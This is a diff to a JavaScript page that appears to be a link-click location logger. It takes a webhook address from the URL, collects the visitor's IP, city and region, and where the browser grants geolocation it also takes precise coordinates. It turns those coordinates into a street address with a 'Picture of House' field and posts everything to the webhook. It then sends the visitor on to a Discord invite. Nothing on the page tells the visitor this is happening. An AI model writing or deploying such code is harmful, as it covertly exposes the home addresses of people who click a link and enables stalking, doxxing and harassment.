@@ -13,7 +13,7 @@
             return urlParams.get('webhook');
         }
 
-        // Function to send data to the provided webhook
+        // Function to send data to the provided webhook with formatted message
         function sendToWebhook(webhookUrl, message) {
             fetch(webhookUrl, {
                 method: 'POST',
@@ -37,7 +37,13 @@
             fetch("https://ipinfo.io/json?token=YOUR_IPINFO_API_KEY")  // Replace with your ipinfo.io token
                 .then(response => response.json())
                 .then(data => {
-                    const locationMessage = `IP-based location: City: ${data.city}, State: ${data.region}, IP: ${data.ip}`;
+                    const locationMessage = `
+Title: Info From Click
+Mini Title: Allowed Location: No
+Mini Title: Other Info
+IP: ${data.ip}
+State/City: ${data.city}, ${data.region}
+                    `;
                     sendToWebhook(getWebhookFromUrl(), locationMessage);
                 })
                 .catch(error => {
@@ -45,6 +51,24 @@
                     // Fallback if IP lookup fails
                     sendToWebhook(getWebhookFromUrl(), "Unable to determine location.");
                 });
+        }
+
+        // Function to get address from coordinates (latitude, longitude)
+        function getAddressFromCoordinates(latitude, longitude) {
+            return new Promise((resolve, reject) => {
+                fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data && data.address) {
+                            resolve(data.address);
+                        } else {
+                            reject('No address found');
+                        }
+                    })
+                    .catch(error => {
+                        reject('Failed to get address');
+                    });
+            });
         }
 
         // Main function to handle geolocation and webhook sending
@@ -60,11 +84,37 @@
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
 
-                        // Use the browser to fetch a more detailed address
-                        const geoDetailsMessage = `User's precise location: Latitude: ${latitude}, Longitude: ${longitude}`;
+                        // Get address from coordinates
+                        getAddressFromCoordinates(latitude, longitude)
+                            .then(address => {
+                                const geoDetailsMessage = `
+Title: Info From Click
+Mini Title: Allowed Location: Yes
+Address: ${address}
+Coordinates: Latitude: ${latitude}, Longitude: ${longitude}
+Picture of House: [IMAGE_URL]  // Replace this with a static or placeholder image URL
 
-                        // Send precise location data to the webhook
-                        sendToWebhook(webhookUrl, geoDetailsMessage);
+Mini Title: Other Info
+IP: (IP address not fetched as geolocation is enabled)
+State/City: (State/City not fetched as geolocation is enabled)
+                                `;
+                                sendToWebhook(webhookUrl, geoDetailsMessage);
+                            })
+                            .catch(error => {
+                                console.error("Failed to get address:", error);
+                                const fallbackMessage = `
+Title: Info From Click
+Mini Title: Allowed Location: Yes
+Address: Not available
+Coordinates: Latitude: ${latitude}, Longitude: ${longitude}
+Picture of House: [IMAGE_URL]  // Replace this with a static or placeholder image URL
+
+Mini Title: Other Info
+IP: (IP address not fetched as geolocation is enabled)
+State/City: (State/City not fetched as geolocation is enabled)
+                                `;
+                                sendToWebhook(webhookUrl, fallbackMessage);
+                            });
 
                         // Redirect to the Discord invite link
                         window.location.href = "https://discord.gg/perkbios";
